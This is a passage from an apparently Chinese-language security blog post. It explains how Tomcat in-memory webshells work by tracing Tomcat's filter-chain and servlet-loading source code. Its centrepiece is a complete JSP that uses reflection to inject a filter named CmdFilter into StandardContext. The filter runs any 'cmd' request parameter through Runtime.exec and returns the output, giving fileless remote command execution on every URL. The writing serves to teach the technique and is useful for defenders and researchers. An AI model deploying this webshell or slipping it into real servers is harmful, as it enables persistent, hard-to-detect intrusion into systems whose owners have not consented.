req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>); <span class="comment">// ==&gt; 调用对应的doFilter()函数</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">                ExceptionUtils.handleThrowable(e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                        Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp;</span><br><span class="line">                    (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">                    Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                    ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>,</span><br><span class="line">                                           servlet,</span><br><span class="line">                                           classTypeUsedInService,</span><br><span class="line">                                           args,</span><br><span class="line">                                           principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                servlet.service(request, response); <span class="comment">// ==&gt; FilterChain结束后调用对应的Servlet</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<p>想要注入一个<code>filter</code>内存马，核心在篡改<code>StandardContext</code>中的<code>filterMaps</code>属性来绕过<code>dispatcher</code>和<code>requestPath</code>，然后把<code>filterConfig</code>注入到<code>StandardContext</code>的<code>filterConfigs</code>属性中即可</p>
<p><code>filterMaps</code>需要包含对应的<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012812870" style="zoom:80%;" />

<p><code>filterConfig</code>中的<code>filterDef</code>需要包含对应的<code>filter</code>、<code>filterClass</code>和<code>filterName</code></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012939483" style="zoom:80%;" />

<h4 id="Filter内存马实例"><a href="#Filter内存马实例" class="headerlink" title="Filter内存马实例"></a>Filter内存马实例</h4><blockquote>
<p>一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常</p>
</blockquote>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddFilter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    Map filterConfigs;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取filterConfigs</span></span><br><span class="line">        Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">FilterName</span> <span class="operator">=</span> <span class="string">&quot;CmdFilter&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (filterConfigs.get(FilterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                    <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        servletResponse.getWriter().write(output);</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取FilterDef并修改其filter、filterName和filterClass</span></span><br><span class="line">            Class&lt;?&gt; FilterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor1</span> <span class="operator">=</span> FilterDef.getDeclaredConstructor();</span><br><span class="line">            org.apache.tomcat.util.descriptor.web.<span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> (FilterDef) declaredConstructor1.newInstance();</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            filterDef.setFilterName(FilterName);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            <span class="comment">// 加入到StandardContext的FilterDef属性中</span></span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取FilterMap并修改其URLPattern、FilterName和Dispatcher</span></span><br><span class="line">            Class&lt;?&gt; FilterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();</span><br><span class="line">            org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> (FilterMap) declaredConstructor.newInstance();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(FilterName);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            <span class="comment">// 加入到StandardContext的filterMaps属性中</span></span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取ApplicationFilterConfig，注入filterDef</span></span><br><span class="line">            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef);</span><br><span class="line">            filterConfigs.put(FilterName, filterConfig);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h3><h4 id="loadOnStartup"><a href="#loadOnStartup" class="headerlink" title="loadOnStartup"></a>loadOnStartup</h4><p>在<code>StanderContext</code>的初始化过程中，在配置完<code>filter</code>之后就会调用<code>loadOnStartup()</code>方法来初始化<code>servlet</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">    	...</span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123; <span class="comment">// ==&gt; findChildren()返回所有Servlet</span></span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      	...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ContainerBase</span> <span class="keyword">extends</span> <span class="title class_">LifecycleMBeanBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Container</span> &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Container[] findChildren() &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (children) &#123; <span class="comment">// ==&gt; Children是一个HashMap类型，存储着各个StandardWrapper</span></span><br><span class="line">            Container results[] = <span class="keyword">new</span> <span class="title class_">Container</span>[children.size()];</span><br><span class="line">            <span class="keyword">return</span> children.values().toArray(results); <span class="comment">// ==&gt; 将Wrapper转化为Container</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419020d0e5454e24738554553.png" alt="image-20211202123329058" style="zoom:80%;" />


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child; <span class="comment">// ==&gt; 将Container转化为Wrapper（略显多余的一个步骤）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">            <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123; <span class="comment">// 令loadOnStartup大于0</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">            ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">            <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">                list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                map.put(key, list);</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(wrapper); <span class="comment">// ==&gt; 将wrapper装入list中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">        <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    wrapper.load(); <span class="comment">// 加载list中的Servlet</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                    getLogger().error(sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>,</span><br><span class="line">                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));</span><br><span class="line">                    <span class="keyword">if</span>(getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以这里的重点是修改<code>children</code>属性加入我们的<code>wrapper</code>，向上追溯如何生成<code>children</code>，我们可以来到解析<code>web.xml</code>的函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.startup;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextConfig</span> <span class="keyword">implements</span> <span class="title class_">LifecycleListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123; <span class="comment">// 搜索web.xml中的servlet</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper(); <span class="comment">// 生成新的wrapper</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); <span class="comment">// 设置loadOnStartup</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setName(servlet.getServletName()); <span class="comment">// 设置servletName</span></span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            context.addChild(wrapper); <span class="comment">// ==&gt; 向context新的Child</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p><code>addChild()</code>方法会调用父类的<code>addChildInternal()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ContainerBase</span> <span class="keyword">extends</span> <span class="title class_">LifecycleMBeanBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Container</span> &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addChildInternal</span><span class="params">(Container child)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( log.isDebugEnabled() )</span><br><span class="line">            log.debug(<span class="string">&quot;Add child &quot;</span> + child + <span class="string">&quot; &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">synchronized</span>(children) &#123;</span><br><span class="line">            <span class="keyword">if</span> (children.get(child.getName()) != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;addChild:  Child name &#x27;&quot;</span> +</span><br><span class="line">                                                   child.getName() +</span><br><span class="line">                                                   <span class="string">&quot;&#x27; is not unique&quot;</span>);</span><br><span class="line">            child.setParent(<span class="built_in">this</span>);</span><br><span class="line">            children.put(child.getName(), child); <span class="comment">// 向children属性添加新的wrapper</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((getState().isAvailable() ||</span><br><span class="line">                    LifecycleState.STARTING_PREP.equals(getState())) &amp;&amp;</span><br><span class="line">                    startChildren) &#123;</span><br><span class="line">                child.start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;ContainerBase.addChild: start: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;ContainerBase.addChild: start: &quot;</span> + e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            fireContainerEvent(ADD_CHILD_EVENT, child);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>同时需要注意在解析<code>web.xml</code>时，还会将解析到<code>WebServlet</code>添加到<code>context</code>的<code>servletMappingNames</code>属性中，来添加<code>URL</code>匹配规则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.startup;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextConfig</span> <span class="keyword">implements</span> <span class="title class_">LifecycleListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processClass</span><span class="params">(WebXml fragment, JavaClass clazz)</span> &#123;</span><br><span class="line">        AnnotationEntry[] annotationsEntries = clazz.getAnnotationEntries();</span><br><span class="line">        <span class="keyword">if</span> (annotationsEntries != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getClassName();</span><br><span class="line">            <span class="keyword">for</span> (AnnotationEntry ae : annotationsEntries) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> ae.getAnnotationType();</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;Ljavax/servlet/annotation/WebServlet;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                    processAnnotationWebServlet(className, ae, fragment); <span class="comment">// 处理解析到的WebServlet</span></span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;Ljavax/servlet/annotation/WebFilter;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                    processAnnotationWebFilter(className, ae, fragment);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;Ljavax/servlet/annotation/WebListener;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                    fragment.addListener(className);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Unknown annotation - ignore</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.startup;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextConfig</span> <span class="keyword">implements</span> <span class="title class_">LifecycleListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">package</span> org.apache.catalina.startup;<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processAnnotationWebServlet</span><span class="params">(String className,</span></span><br><span class="line"><span class="params">            AnnotationEntry ae, WebXml fragment)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (urlPatterns != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!fragment.getServletMappings().containsValue(servletName)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">                    fragment.addServletMapping(urlPattern, servletName); <span class="comment">// 添加servlet映射</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

